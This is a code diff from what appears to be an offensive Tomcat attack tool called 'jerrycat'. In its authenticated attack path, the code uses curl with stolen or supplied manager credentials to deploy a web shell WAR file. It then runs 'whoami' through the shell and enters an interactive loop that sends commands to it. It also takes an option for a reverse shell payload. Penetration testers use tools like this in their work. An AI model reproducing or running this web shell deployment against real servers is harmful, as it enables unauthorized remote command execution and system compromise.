@@ -201,8 +201,16 @@ class authenticated_attack(tomcat):
             command = f'curl --upload-file webshell/web_shell.war -u "{self.username}:{self.password}" "{self.url}/manager/text/deploy?path=/web_shell"'
             subprocess.run(command, shell=True, check=True)
 
-        cmd = input("jerrycat > ")
-        self.execute_webshell_cmd(cmd=cmd)
+        response = self.execute_webshell_cmd(cmd="whoami")
+
+        if response:
+            output.message(state="ongoing", description="Spawning webshell...", clear_before=False)
+        else:
+            output.message(state="failed", description="An error occur with the webshell", clear_before=False)
+            output.message(state="exit", description="Jobs finished ? Jobs not finished", clear_before=False)
+            return
+
+        cmd = ''
 
         while cmd != "exit":
             print("[bold red]Jerrycat[/] > ", end="")
@@ -253,6 +261,8 @@ def main():
     reverse_mode.add_argument('-R', '--reverse', dest='reverse', help='path to your reverse shell payload')
 
     args = parser.parse_args()
+
+
 
     # instance new class
     output = output_class()
